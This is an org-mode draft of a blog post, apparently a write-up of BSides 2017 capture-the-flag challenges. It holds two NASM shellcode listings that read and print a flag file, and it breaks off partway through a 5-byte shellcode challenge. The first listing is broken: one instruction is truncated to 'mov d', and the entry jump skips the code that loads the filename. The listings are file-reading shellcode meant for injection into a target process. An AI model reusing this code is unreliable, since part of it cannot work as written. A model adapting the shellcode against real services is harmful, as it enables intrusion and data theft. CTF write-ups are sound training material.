org/_posts/2017-02-14-bsides-ctf-writeup.org
** TODO Skipper2

** Easyshell 1 
   Both of the easyshell puzzles are warmups who run any shellcode sent on the
   wire. However, you can't use some of the most common shellcode for spawning
   =/bin/sh= as there is no remote shell. This shellcode reads the file
   =/home/ctf/flag.txt=

   Compile with ~nasm -f bin flag.asm~

   #+BEGIN_SRC nasm
BITS 64
section .text

_start:
  xor    eax,eax
  xor    ebx,ebx
  xor    ecx,ecx
  xor    edx,edx
  jmp    read

one:
  pop    rbx
  mov    al,0x5
  xor    ecx,ecx
  int    0x80
  mov    esi,eax
  jmp    read

exit:
  mov    al,0x1
  xor    ebx,ebx
  int    0x80

read:
  mov    ebx,esi
  mov    al,0x3
  sub    esp,0x1
  lea    ecx,[rsp]
  mov    dl,0x1
  int    0x80
  xor    ebx,ebx
  cmp    ebx,eax
  je     exit
  mov    al,0x4
  mov    bl,0x1
  mov    d
  int    0x80
  add    esp,0x1
  jmp    read

two:
  call   one
  string: db "/home/ctf/flag.txt"
   #+END_SRC


** Easyshell 2
   Like the prior challenge, you simply just need to write some code to read out
   a file. I used the following.

   #+BEGIN_SRC nasm
 BITS 64
 section .text
 _start:
   jmp _push_filename

 _readfile:
   ; syscall open file
   pop rdi ; pop path value
   xor rax, rax
   add al, 2
   xor rsi, rsi ; set O_RDONLY flag
   syscall
  
   ; syscall read file
   sub sp, 0xfff
   lea rsi, [rsp]
   mov rdi, rax
   xor rdx, rdx
   mov dx, 0xfff; size to read
   xor rax, rax
   syscall
  
   ; syscall write to stdout
   xor rdi, rdi
   add dil, 1 ; set stdout fd = 1
   mov rdx, rax
   xor rax, rax
   add al, 1
   syscall
  
   ; syscall exit
   xor rax, rax
   add al, 60
   syscall
  
 _push_filename:
   call _readfile
   path: db "/home/ctf/flag.txt"
   #+END_SRC

** i-am-the-shortest
   This is a challenge designed to mimic the common constraints exploit authors must deal with.

   The premise of the challenge is that you get to execute 5 arbitrary bytes - far
   shorter than even the shortest shellcode could allow for.

   There's undoubtedly dozens of ways the problem can be solved, I've successfully used two:

